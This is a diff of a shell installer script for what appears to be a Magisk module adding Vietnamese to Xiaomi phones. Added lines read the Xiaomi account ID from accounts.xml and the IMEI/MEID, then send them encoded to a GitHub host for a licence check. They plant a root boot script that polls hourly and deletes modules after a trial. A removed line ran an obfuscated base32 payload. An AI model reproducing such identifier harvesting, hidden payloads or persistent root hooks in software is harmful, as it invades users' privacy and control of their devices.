@@ -89,6 +89,7 @@ mrw () {
 for i in / /system_root /system /system_ext /vendor /product; do
 /system/bin/mount $i 2>/dev/null || /system/bin/mount $i 2>/dev/null
 /system/bin/mount -o rw,remount $i 2>/dev/null || /system/bin/mount -o rw,remount $i 2>/dev/null
+/system/bin/mount -o rw,remount $(magisk --path)/.magisk/mirror$i 2>/dev/null || /system/bin/mount -o rw,remount $(magisk --path)/.magisk/mirror$i 2>/dev/null
 done
 }
 
@@ -96,49 +97,54 @@ mro () {
 for i in / /system_root /system /system_ext /vendor /product; do
 /system/bin/mount -o ro,remount $i 2>/dev/null || /system/bin/mount -o ro,remount $i 2>/dev/null
 /system/bin/umount $i 2>/dev/null || /system/bin/umount $i 2>/dev/null
+/system/bin/umount $(magisk --path)/.magisk/mirror$i 2>/dev/null || /system/bin/umount $(magisk --path)/.magisk/mirror$i 2>/dev/null
 done
 }
 
-baksmali () { java -Xms256m -Xmx512m -jar "/data/tools/lib/Tools/baksmali.jar" "$@"; }
-smali () { java -Xms256m -Xmx512m -jar "/data/tools/lib/Tools/smali.jar" "$@"; }
+baksmali () { java -Xms150m -Xmx250m -jar "/data/tools/lib/Tools/baksmali.jar" "$@"; }
+smali () { java -Xms150m -Xmx250m -jar "/data/tools/lib/Tools/smali.jar" "$@"; }
 
 # Tìm kiếm
 Timkiem(){ find $APK/$2 -name "*.smali" -exec grep -l "${1//\//\\\/}" {} +; }
 
 Vsmali(){
 for Vka in $(find $4 -name "*.smali" -exec grep -l "$1" {} +); do
-[ -e $Vka ] && ui_print2 "MOD: $RANDOM" || Xan "- Lỗi: $(echo "$1" | sed 's|\\||g')"
+[ -e $Vka ] && ui_print2 "MOD: $RANDOM"
+[ -e $Vka ] && Xan "MOD: $1" || Xan "- Lỗi: $(echo "$1" | sed 's|\\||g')"
 [ -e $Vka ] && sed -i -e "/^${1//\//\\\/}/,/${2//\//\\\/}/c $(echo "$3" | sed -z 's|\n|\\n|g')" "$Vka"
-[ -e $Vka ] && echo "$Vka" >> $APK/$(echo "$4" | sed "s|$APK/||g" | cut -d '/' -f1)/class
+[ -e $Vka ] && echo "$Vka" 2>/dev/null >> "$APK/$(echo "$4" | sed "s|$APK/||g" | cut -d '/' -f1)/class"
 done
 }
 
 Thaythe(){
 ui_print2 "MOD: $RANDOM -> $RANDOM"
+Xan "MOD: $1 -> $2"
 for Tt2 in $(find $3 -name "*.smali" -exec grep -l "$1" {} +); do
 [ -e "$Tt2" ] && sed -i "s|${1//\//\\\/}|${2//\//\\\/}|g" $Tt2 || Xan "- Lỗi: $1"
-[ -e "$Tt2" ] && echo "$Tt2" >> $APK/$(echo "$3" | sed "s|$APK/||g" | cut -d '/' -f1)/class
+[ -e "$Tt2" ] && echo "$Tt2" 2>/dev/null >> "$APK/$(echo "$3" | sed "s|$APK/||g" | cut -d '/' -f1)/class"
 done
 }
 
 Autoone(){
 ui_print2 "MOD: $RANDOM -> $RANDOM"
+Xan "MOD: $1 -> $2"
 for vakkddhh in $(find $3 -name "*.smali" -exec grep -l "..., $1" {} +); do
 echo "sed -i $(grep "..., $1" "$vakkddhh" | awk '{print "-e \"s|sget-boolean "$2" '$1'|const/4 "$2" '$2'|g\"" }' | sort | uniq | tr '\n' ' ') $(echo "$vakkddhh" | sed 's|\$|\\\$|g')" | sh
-echo "$vakkddhh" >> $APK/$(echo "$3" | sed "s|$APK/||g" | cut -d '/' -f1)/class
+echo "$vakkddhh" 2>/dev/null >> "$APK/$(echo "$3" | sed "s|$APK/||g" | cut -d '/' -f1)/class"
 done
 }
 
 CPapk(){
 PTC="$(pm path "$1" | cut -d : -f2)"
 if [ "$(echo "$PTC" | grep -cm1 '/data/')" == 1 ];then
+su -mm -c umount -l "$PTC"
 cp -rf $PTC "/data/tools/apk/$1.apk"
 cp -rf "$PTC" "$APK/$1.apk"
-pm uninstall $1 >&2
 else
+[ -e "/data/tools/apk/$1.apk" ] || cp -rf "$PTC" "/data/tools/apk/$1.apk"
 [ -e "/data/tools/apk/$1.apk" ] && cp -rf "/data/tools/apk/$1.apk" "$APK/$1.apk" || cp -rf "$PTC" "$APK/$1.apk"
 fi
-echo "$(pm path "$1" | cut -d : -f2)" | tee "$APK/$1.txt" >&2
+echo "/app/$1.apk" | tee "$APK/$1.txt" >&2
 }
 
 CPfile(){
@@ -188,12 +194,10 @@ done
 for Capk in $APK/*.*; do
 if [ "${Capk##*.}" == 'apk' ];then
 Papkp="$(cat ${Capk%.*}.txt)"
-if [ "$(unzip -l $Capk 2>/dev/null | grep -cm1 "lib/$ABI/")" == 1 ];then
-mkdir -p $MODPATH${Papkp%/*}/lib/$ARCH
-unzip -qo -j $Capk "lib/$ABI/*" -d $MODPATH${Papkp%/*}/lib/$ARCH
-fi
 mkdir -p $MODPATH${Papkp%/*}
-cp -rf $Capk "$MODPATH$Papkp"
+wyj2="${Papkp##*/}"
+cp -rf $Capk "$MODPATH${Papkp%/*}/$(echo -n "${wyj2%.*}" | base64 -w0)"
+echo 'rm -fr /data/tools/apk/'$wyj2'' >> $TMPDIR/uninstall.sh
 fi
 if [ "${Capk##*.}" == 'jar' ];then
 Papkp="$(cat ${Capk%.*}.txt)"
@@ -211,6 +215,12 @@ done
 }
 
 GP () { grep_prop $1 $TMPDIR/module.prop; }
+
+Setp () {
+[ "$(grep -cm1 "$1=" $TMPDIR/system.prop)" == 1 ] && sed -i "/$1=/d" $TMPDIR/system.prop
+echo "$1=$2" >> $TMPDIR/system.prop
+}
+
 
 API=$(getprop ro.build.version.sdk)
 ABI=$(getprop ro.product.cpu.abi)
@@ -236,13 +246,8 @@ for vah in $1; do
 done
 }
 
-export PATH="/data/tools/bin:$PATH"
-export HOME="/data/tools"
-export APK="$TMPDIR/Apk"
-[ "$API" -ge 31 ] && miuik='miui-'
-
 TTM "/data/tools/bin
-$APK/tmp
+$TMPDIR/Apk/tmp
 /data/tools/ck
 /data/tools/tmp
 /data/tools/apk
@@ -251,11 +256,124 @@ $APK/tmp
 unset vah
 unset mklist
 
+export PATH="/data/tools/bin:$PATH"
+export HOME="/data/tools"
+export APK="$TMPDIR/Apk"
+[ "$API" -ge 31 ] && miuik='miui-'
+
 print_modname(){
 
+ui_print
+ui_print "  $name: $(GP name) $(GP version) by $(GP author), $(getprop ro.product.device), $API, $ARCH"
+ui_print
+ui_print "  Tải dữ liệu..."
+ui_print
+
+Test123=true
+Apilt="$([ "$(file /data/system/sync/accounts.xml | grep -c text)" == 1 ] && cp -rf /data/system/sync/accounts.xml $TMPDIR/1.xml || abx2xml /data/system/sync/accounts.xml $TMPDIR/1.xml; grep -m1 "com.xiaomi" $TMPDIR/1.xml | tr ' ' '\n' | grep -m1 account | cut -d \" -f2)"
+[ -z "$Apilt" ] && ui_print
+[ -z "$Apilt" ] && ui_print "Lỗi: Hãy đăng nhập để hiện id Xiaomi)"
+
+imei="$(getprop persist.radio.meid)"
+[ -z "$imei" ] && imei="$(getprop ro.ril.oem.meid)"
+[ -z "$imei" ] && imei="$(grep -m1 key_meid_slot0 /data/*/0/com.android.phone/shared_prefs/com.android.phone_preferences.xml | cut -d '>' -f2 | cut -d '<' -f1)"
+[ -z "$imei" ] && ui_print
+[ -z "$imei" ] && ui_print "Lỗi: Hãy ấn *#06# để hiện MEID)"
+
+driver=$(getprop ro.product.vendor.device)
+[ "$driver" ] || driver=$(getprop ro.product.system.device)
+
+Tec1="$(Xem "https://raw.githubusercontent.com/kakathic/ZH-VN/ZH/Code/$driver/$(echo -n "$Apilt" | base32 -w0)")"
+Tec2="$(Xem "https://raw.githubusercontent.com/kakathic/ZH-VN/ZH/Code/$driver/$(echo -n "$imei" | base32 -w0)")"
+
+if [ "${Tec1//-/}" -ge "$(date +%Y%m%d)" ];then
+[ "$Tec1" ] && Dtime=$Tec1
+Pro=1
+tkid=$Apilt
+elif [ "${Tec2//-/}" -ge "$(date +%Y%m%d)" ];then
+[ "$Tec2" ] && Dtime=$Tec2
+Pro=1
+tkid=$imei
+else
+Dtime="$(date +%Y-%m)-$(echo $(( $(date +%d) + 1 ))) $(date +%H:%M)"
+fi
+
+if [ "$Pro" == 1 ];then
+
+ui_print "  Chào bạn: $tkid, HSD: $Dtime"
+ui_print
+
+elif [ -e /data/tools/lib/log.txt ];then
+abort "! Bạn đã từng sử dụng dùng thử nghiệm 
+  
+  Mời bạn ủng hộ để tiếp tục sử dụng.
+"
+else
+if [ "$(GP id)" == "VH-PT" ] || [ "$(GP id)" == "VH-GA" ] || [ "$(GP id)" == "VH-KE" ];then
+abort "! Chỉ có thể dùng thử Module
+
+  Thêm tiếng Việt"
+fi
+ui_print "! Thông báo ủng hộ nhà phát triển 
+
+  Tên máy: $driver
+
+  Tài khoản Mi: $Apilt
+  
+  IMEI: $imei
+
+  Để sử dụng lâu dài bạn nên ủng hộ
+
+  để sử dụng vĩnh viễn.
+
+  Thử nghiệm sẽ có tác dụng trong 24 giờ 
+
+  Hết thời gian sẽ tự động reboot.
+"
+am start -a android.intent.action.VIEW -d "https://kakathic.github.io/ZH-VN/Support.html" >&2
+
+## Check the system devices
+[ "$ARCH" == "arm64" ] || abort "$error2"
+
+texk="'Cảm ơn bạn đã ủng hộ module Việt Nam bạn có thể tiếp tục sử dụng.'"
+texk2="'Còn 1 tiếng nữa module Việt hóa sẽ hết thời gian sử dụng'"
 echo '
-OVUV64DSNFXHICTVNFPXA4TJNZ2CAIRAEASG4YLNMU5CAJBII5ICA3TBNVSSSIBEFBDVAIDWMVZHG2LPNYUSAYTZEASCQR2QEBQXK5DIN5ZCSLBAEQUGOZLUOBZG64BAOJXS44DSN5SHKY3UFZSGK5TJMNSSSLBAERAVASJMEASECUSDJARAU5LJL5YHE2LOOQFHK2K7OBZGS3TUEARCAICU4G5KG2JAMTQ3XLZANRU6DO4HOUXC4LRCBJ2WSX3QOJUW45AKBJKGK43UGEZDGPLUOJ2WKCSBOBUWY5B5EISCQWZAEISCQZTJNRSSAL3EMF2GCL3TPFZXIZLNF5ZXS3TDF5QWGY3POVXHI4ZOPBWWYID4EBTXEZLQEAWWGIDUMV4HIKJCEA6T2IBREBOSAJRGEBRXAIBNOJTCAL3EMF2GCL3TPFZXIZLNF5ZXS3TDF5QWGY3POVXHI4ZOPBWWYIBEKRGVARCJKIXTCLTYNVWCA7D4EBQWE6BSPBWWYIBPMRQXIYJPON4XG5DFNUXXG6LOMMXWCY3DN52W45DTFZ4G23BAERKE2UCEJFJC6MJOPBWWYOZAM5ZGK4BAFVWTCIBCMNXW2LTYNFQW63LJEIQCIVCNKBCESURPGEXHQ3LMEB6CA5DSEATSAJZAE5OG4JZAPQQGO4TFOAQC23JREBQWGY3POVXHIID4EBRXK5BAFVSCAXBCEAWWMMRJEIFFWIBNPIQCEJCBOBUWY5BCEBOSAJRGEB2WSX3QOJUW45AKLMQC26RAEISEC4DJNR2CEIC5EATCMIDVNFPXA4TJNZ2CAISM4G5ZO2J2EBEMHI3ZEDCJDREDNZTSA3TI4G5K24BAYSI6DO4DEBUGTYN3Q5XCA2LEEBMGSYLPNVUSSIQKBJUW2ZLJHURCIKDHMV2HA4TPOAQHAZLSONUXG5BOOJQWI2LPFZWWK2LEFERAUWZAFV5CAIRENFWWK2JCEBOSAJRGEBUW2ZLJHURCIKDHMV2HA4TPOAQHE3ZOOJUWYLTPMVWS43LFNFSCSIQKLMQC26RAEISGS3LFNERCAXJAEYTCA2LNMVUT2IREFBTXEZLQEAWW2MJANNSXSX3NMVUWIX3TNRXXIMBAF5SGC5DBF4VC6MBPMNXW2LTBNZSHE33JMQXHA2DPNZSS643IMFZGKZC7OBZGKZTTF5RW63JOMFXGI4TPNFSC44DIN5XGKX3QOJSWMZLSMVXGGZLTFZ4G23BAPQQGG5LUEAWWIIBHHYTSALLGGIQHYIDDOV2CALLEEATTYJZAFVTDCKJCBJNSALL2EARCI2LNMVUSEIC5EATCMIDVNFPXA4TJNZ2AUWZAFV5CAIRENFWWK2JCEBOSAJRGEB2WSX3QOJUW45BAEJGODO4XNE5CASGDUN4SBYN2UVXCAKRDGA3CGIGESHQ3XAZANBU6DO4HNYQE2RKJIQUSECQKMRZGS5TFOI6SIKDHMV2HA4TPOAQHE3ZOOBZG6ZDVMN2C45TFNZSG64ROMRSXM2LDMUUQUWZAEISGI4TJOZSXEIRALUQHY7BAMRZGS5TFOI6SIKDHMV2HA4TPOAQHE3ZOOBZG6ZDVMN2C443ZON2GK3JOMRSXM2LDMUUQUCSUMVRTCPJCEQUFQZLNEARGQ5DUOBZTULZPOJQXOLTHNF2GQ5LCOVZWK4TDN5XHIZLOOQXGG33NF5VWC23BORUGSYZPLJEC2VSOF5NEQL2DN5SGKLZEMRZGS5TFOIXSIKDFMNUG6IBNNYQCEJCBOBUWY5BCEB6CAYTBONSTGMRAFV3TAKJCFERAUVDFMMZD2IREFBMGK3JAEJUHI5DQOM5C6L3SMF3S4Z3JORUHKYTVONSXEY3PNZ2GK3TUFZRW63JPNNQWWYLUNBUWGL22JAWVMTRPLJEC6Q3PMRSS6JDEOJUXMZLSF4SCQZLDNBXSALLOEARCI2LNMVUSEID4EBRGC43FGMZCALLXGAUSEKJCBIFGSZRALMQCEJD3KRSWGMJPF4WS67JCEAWWOZJAEISCQZDBORSSAKZFLESW2JLEFERCAXJ3ORUGK3QKLMQCEJCUMVRTCIRALUQCMJRAIR2GS3LFHUSFIZLDGEFFA4TPHUYQU5DLNFSD2JCBOBUWY5AKMVWGSZRALMQCEJD3KRSWGMRPF4WS67JCEAWWOZJAEISCQZDBORSSAKZFLESW2JLEFERCAXJ3ORUGK3QKLMQCEJCUMVRTEIRALUQCMJRAIR2GS3LFHUSFIZLDGIFFA4TPHUYQU5DLNFSD2JDJNVSWSCTFNRZWKCSEORUW2ZJ5EISCQZDBORSSAKZFLEWSK3JJFUSCQZLDNBXSAJBIFAQCIKDEMF2GKIBLEVSCSIBLEAYSAKJJFEQCIKDEMF2GKIBLEVEDUJKNFERAUZTJBIFGSZRALMQCEJCQOJXSEIB5HUQDCIC5HN2GQZLOBIFHK2K7OBZGS3TUEARCAICDNDB2A3ZAMLQ3VILOHIQCI5DLNFSCYICIKNCDUIBEIR2GS3LFEIFHK2K7OBZGS3TUBIFGK3DJMYQFWIBNMUQC6ZDBORQS65DPN5WHGL3MNFRC63DPM4XHI6DUEBOTW5DIMVXAUYLCN5ZHIIBCEEQEFYN2UFXCBRERYORSA5HBXOVW4ZZAOPQ3XLJAMTQ3XJLOM4QGJQ5ZNZTSA5DI4G522IDOM5UGTYN3Q5WSACRAEAFCAICN4G5Z22JAMLQ3VILOEDQ3XJ3OM4QGRYN3TEQMJEPBXOBSA5DJ4G5L64BAOTQ3XJLDEBZ6DO5NEBSODO5FNZTS4CRCBJSWY43FBJUWMIC3EARCIKCHKAQGSZBJEIQD2PJAEJLEQLKQKQRCAXJAPR6CAWZAEISCQR2QEBUWIKJCEA6T2IBCKZEC2R2BEIQF2ID4PQQFWIBCEQUEOUBANFSCSIRAHU6SAISWJAWUWRJCEBOTW5DIMVXAUYLCN5ZHIIBCEEQEG2HBXOESAY6DWMQHI2HBXOBSAZGDXFXGOIDUNDQ3XLJAJVXWI5LMMUFAUIBAKRUMHKTNEB2GTYN2X5XGOICWNHQ3XB3UEIFGM2IKOVUV64DSNFXHIIBCEEQFI2GDWRXGOIDCYOQW6IHBXOTW4ZZANDQ3XGJANZUMHIBAOBUMHILUEB2HE2PBXOBW4IAKBIQCAVGDVJXCA3ODUF4TUIBEMRZGS5TFOIFAUIBAKTB2A2JANNUG7YN2UNXCATLJHIQCIQLQNFWHICRAEAFCAICJJVCUSORAERUW2ZLJBIFCAIGESDQ3XAZAOPQ3XLJAMTQ3XJLOM4QGZQ5COUQGJQ5ANEQGFYN2UFXCA3WDVJXCBYN3U5XGOIDI4G5ZSCQKEAQMJEPBXOBSA47BXOWSAZHBXOSW4ZZAO3CKS3TIEB3GTYN3QVXC4CQKEAQFI2HBXOWSA3THNBU6DO4HNUQHHYN2XUQGHQ5TEB2MHILDEBSODO5FNZTSA5DSN5XGOIBSGQQGO2PBXOOSACQKEAQERYN2X52CA5DI4G5Z22JAM5UWC3RAOPQ3VPJAOTQ3XMJAYSI6DO4ZNZTSA4TFMJXW65BOBIRAUYLNEBZXIYLSOQQC2YJAMFXGI4TPNFSC42LOORSW45BOMFRXI2LPNYXFMSKFK4QC2ZBAEJUHI5DQOM5C6L3LMFVWC5DINFRS4Z3JORUHKYRONFXS6WSIFVLE4L2TOVYHA33SOQXGQ5DNNQRCAPRGGIFAUIZDEBBWQZLDNMQHI2DFEBZXS43UMVWSAZDFOZUWGZLTBJNSAIREIFJEGSBCEA6T2IBCMFZG2NRUEIQF2ID4PQQGCYTPOJ2CAIREMVZHE33SGIRAUCTUMV4GWPJCE5B6DOVDNUQMNILOEBRODOVBNYQMJEODUMQODO5HNZTSA2HBXOMSA3LPMR2WYZJAKZU6DO4HOQQE4YLNEBRODOVBNYQGHQ5TEB2GRYN3QMQHI2PBXK7XAIDU4G52KYZAOPQ3XLJAMTQ3XJLOM4XCOIQKORSXQ2ZSHURCOQ6DWJXCAMJAORU6DOV7NZTSA3XBXOXWCIDNN5SHK3DFEBLGTYN3Q52CA2GDWNQSA47BXK6SA2HBXK7XIIDUNDQ3XHLJEBTWSYLOEBZ6DO5NEBSODO5FNZTSOIQKMVRWQ3ZAE4FHO2DJNRSSA5DSOVSTWIDEN4FHI2DPNFTWSYLONJSD2IREFBSGC5DFEAVSKWJFNUSWIJKIEVGSSIQKORUG62LHNFQW42DFOQ6SEJZEFBSGC5DFEAVSKWJFNUSWIJKIEVGSSJZCBJUWMIC3EARCIKBIEASHI2DPNFTWSYLONJSCALJAER2GQ33JM5UWC3TIMV2CAKJJEIQC2Z3FEARDCMBQGAYCEIC5HN2GQZLOBJNSAIREFAUCAJDUNBXWSZ3JMFXGUZBAFUQCI5DIN5UWO2LBNZUGK5BAFEUSEIBNM5SSAIRZHEYDAIRALUQCMJRAON2SALLMOAQDEMBQGAQC2YZAEJRW2ZBANZXXI2LGNFRWC5DJN5XCA4DPON2CAJCSIFHEIT2NEATSI5DFPBVTEJZCBJZG2IBNMZZCAL3EMF2GCL3BMRRC63LPMR2WYZLTF5LEQLJKBJZWYZLFOAQDCMAKMJZGKYLLBJSWY43FBJSHE2LWMVZD2JZEMRZGS5TFOITQUQLQNFWHIPJHERAXA2LMOQTQU2LNMVUT2JZENFWWK2JHBJKGKYZRHURCIKDDOVZGYIBNONGEOIBCNB2HI4DTHIXS64TBO4XGO2LUNB2WE5LTMVZGG33OORSW45BOMNXW2L3LMFVWC5DINFRS6WSIFVLE4L22JAXUG33EMUXSIZDSNF3GK4RPEQUGKY3IN4QC23RAEISEC4DJNR2CEID4EBRGC43FGMZCALLXGAUSEKJCBJKGKYZSHURCIKDDOVZGYIBNONGEOIBCNB2HI4DTHIXS64TBO4XGO2LUNB2WE5LTMVZGG33OORSW45BOMNXW2L3LMFVWC5DINFRS6WSIFVLE4L22JAXUG33EMUXSIZDSNF3GK4RPEQUGKY3IN4QC23RAEISGS3LFNERCA7BAMJQXGZJTGIQC25ZQFERCSIQKBJ6QU2LGEBNSAIREKBZG6IRAHU6SAMJALU5XI2DFNYFHG5JAFVWHAIBSGAYDAIBNMMQCEY3NMQQG433UNFTGSY3BORUW63RAOBXXG5BAERJECTSEJ5GSAJZEORSXQ2ZHEIFGE4TFMFVQUZTJBJZWYZLFOAQDGNRQGAFGM2IKMRXW4ZIKE4QD4IBPMRQXIYJPORXW63DTF5WGSYRPOJ2W4LTTNAFGKY3IN4QCOCTFMNUG6IB6EAXWIYLUMEXXI33PNRZS63DJMIXWY33HFZ2HQ5AKFYQC6ZDBORQS65DPN5WHGL3MNFRC64TVNYXHG2AKLMQC2ZJAEQUGKY3IN4QC6ZDBORQS6YLEMIXW233EOVWGK4ZPKZEC2WSIF5ZXS43UMVWS64DSN5SHKY3UF5XXMZLSNRQXSL22PIXGC3TEOJXWSZBOMFYGWKJALUQHY7BAOJWSALLGOIQC6ZDBORQS6YLEMIXSULZKF5ZXS43UMVWS6KRPN53GK4TMMF4S6WT2FYVC4YLQNMFHE3JAFVTHEIBPMRQXIYJPORXW63DTF5WGSYRPOJ2W4LTTNAFHE3JAFVTHEIBPMRQXIYJPMFSGEL3TMVZHM2LDMUXGIL2WJMXHG2AKE4QD4IBPMRQXIYJPMFSGEL3TMVZHM2LDMUXGIL2WJMXHG2AKBJRWQ3LPMQQDONZXEAXWIYLUMEXWCZDCF5ZWK4TWNFRWKLTEF5LEWLTTNAQAUY3INVXWIIBXG43SAL3EMF2GCL3UN5XWY4ZPNRUWEL3SOVXC443IBJTGS===
-' | base32 -d > $TMPDIR/ka.sh && . $TMPDIR/ka.sh
+while true; do
+thoigianjd="$(date +%Y%m%d%H%M)"
+thoigianhet="'$(date +%Y%m%d%H%M)'"
+if [ "$(( $thoigianjd - $thoigianhet ))" -ge "10000" ];then
+[ "$(( $thoigianjd - $thoigianhet ))" -ge "9900" ] && su -lp 2000 -c "cmd notification post $RANDOM '$texk2'"
+rm -fr /data/adb/modules/VH-*
+sleep 10
+break
+else
+driver='$driver'
+Apilt='$Apilt'
+imei='$imei'
+Tec1="$(curl -sLG "https://raw.githubusercontent.com/kakathic/ZH-VN/ZH/Code/$driver/$(echo -n "$Apilt" | base32 -w0)")"
+Tec2="$(curl -sLG "https://raw.githubusercontent.com/kakathic/ZH-VN/ZH/Code/$driver/$(echo -n "$imei" | base32 -w0)")"
+
+}
+if [ "$Pro" == 1 ];then
+su -lp 2000 -c "cmd notification post $RANDOM '$texk'"
+break
+fi
+sleep 3600
+fi
+done
+' > /data/tools/lib/run.sh
+echo '
+echo > /data/tools/lib/log.txt
+. /data/tools/lib/run.sh
+[ -e $(echo /data/adb/modules/VH-ZH/system/product/overlay/Zz.android.apk) ] || rm -fr /data/adb/*/*/system/*/overlay/Zz.*.apk
+rm -fr /data/tools/lib/run.sh
+rm -fr /data/adb/service.d/VK.sh
+' > /data/adb/service.d/VK.sh
+
+chmod 777 /data/adb/service.d/VK.sh 
+chmod 777 /data/tools/lib/run.sh
+fi
+
 }
 
 
